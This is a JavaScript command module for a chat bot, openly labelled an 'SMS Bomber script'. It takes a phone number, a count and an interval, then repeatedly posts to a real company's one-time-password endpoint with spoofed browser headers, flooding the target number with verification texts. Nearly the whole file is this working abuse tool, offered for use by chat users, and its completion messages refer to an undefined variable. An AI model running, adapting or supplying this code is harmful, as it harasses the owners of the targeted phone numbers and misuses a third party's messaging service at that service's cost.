const axios = require('axios');

module.exports = {
    description: "Simple SMS Bomber script",
    role: "user", // or admin botadmin
    cooldown: 10,
    credits: "CJ & Chico",
    execute: function(api, event, args, commands) {
        // Check if the required arguments are provided
        if (args.length < 2) {
            return api.sendMessage("❓| Usage: {PREFIX}smsbomb {number} {number of spams} {interval, default 2 if no input}", event.threadID, event.messageID);
        }

        const phone = args[0];
        const amount = parseInt(args[1]);
        const interval = args.length > 2 ? parseInt(args[2]) : 2;

        // Validate the inputs
        if (isNaN(amount) || isNaN(interval)) {
            return api.sendMessage("❌| Invalid input. Please provide a valid number of spams and interval.", event.threadID, event.messageID);
        }

        const url = "https://9f8rj0jed1.execute-api.us-east-1.amazonaws.com/api/v2/sendOTP";
        const headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://www.tuvoznow.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.tuvoznow.com/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i"
        };

        const bomb = (phone) => {
            const payload = {
                dial_code: "+63",
                phone: phone,
                type: 1
            };

            axios.post(url, payload, { headers: headers })
                .then(response => {
                    console.log(response.data);
                })
                .catch(error => {
                    console.error("Error sending OTP:", error.message);
                });
        };

        const executeBombing = async () => {
            for (let i = 0; i < amount; i++) {
                bomb(phone);
                await new Promise(resolve => setTimeout(resolve, interval * 1000));
            }
        };

        api.sendMessage(`🔄| Starting SMS bombing to ${phone}...`, event.threadID, event.messageID);
            
            executeBombing().then(() => {
                api.sendMessage(`✅| SMS bombing to ${phone} completed over ${amount} times!`, event.threadID, info.messageID);
            }).catch(error => {
                console.error("Error during SMS bombing:", error);
                api.sendMessage(`❌| Error: ${error.message}`, event.threadID, info.messageID);
            });
    }
};
